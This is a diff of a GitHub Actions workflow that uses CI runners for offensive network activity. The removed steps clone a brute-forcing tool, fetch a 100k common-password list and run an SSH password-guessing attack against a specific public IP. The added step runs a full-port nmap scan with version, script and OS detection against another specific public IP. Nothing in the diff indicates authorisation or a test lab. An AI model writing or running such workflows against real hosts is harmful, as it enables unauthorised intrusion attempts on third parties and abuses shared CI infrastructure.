@@ -18,35 +18,21 @@ jobs:
     - name: Download files
       run: |
         sudo apt update
-        sudo apt install nmap wget -y
+        sudo apt install nmap -y
         mkdir -p downloads
         cd downloads
         
-    - name: Clone the Repository
+    - name: Scanning
       run: |
-        git clone https://github.com/xiv3r/bruter.git
-        cd bruter
-        chmod +x bruter.sh
+        nmap -sS -sV -sC -O -p- 143.198.87.82 -oN output.log
         
-    - name: Make User
-      run: |
-        echo demo > user.txt
-
-    - name: Download Password
-      run: |
-        wget -O passwords.txt https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
-
-    - name: Scanning in progress 
-      run: |
-         bash bruter.sh ssh user.txt passwords.txt 194.108.117.16 output.log
-
     - name: Determine release tag
       id: get_tag
       run: |
         if [ "${{ github.event_name }}" == "release" ]; then
           TAG_NAME="${{ github.event.release.tag_name }}"
         else
-          TAG_NAME="test"
+          TAG_NAME="scan"
         fi
         echo "tag_name=$TAG_NAME" >> $GITHUB_OUTPUT
 
